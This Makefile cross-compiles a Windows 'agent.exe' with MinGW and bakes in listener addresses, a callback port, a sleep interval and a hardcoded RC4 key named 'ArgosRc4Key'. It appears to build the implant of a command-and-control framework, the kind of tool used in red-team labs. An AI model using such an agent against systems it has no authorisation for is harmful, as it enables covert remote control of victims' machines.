ifndef LISTENERS
	LISTENERS={\"192.168.56.1\"}
endif

ifndef PORT
	PORT=13337
endif

ifndef SLEEPTIME
	SLEEPTIME=3000
endif

ifndef SECRETKEY
	SECRETKEY="ArgosRc4Key"
endif

LISTENERS_AMOUNT := $(shell echo $(LISTENERS) | tr -cd ',' | wc -c)
LISTENERS_AMOUNT := $(shell echo $$(($(LISTENERS_AMOUNT) + 1)))

out = agent.exe
CC = /usr/bin/x86_64-w64-mingw32-gcc


default:
	$(CC) -std=c11 -o $(out) -DLISTENERS_AMOUNT=$(LISTENERS_AMOUNT) -DLISTENERS="$(LISTENERS)" -DPORT=$(PORT) -DSECRETKEY="\"$(SECRETKEY)\"" -DSLEEPTIME=$(SLEEPTIME) main.c -lwsock32 -lws2_32
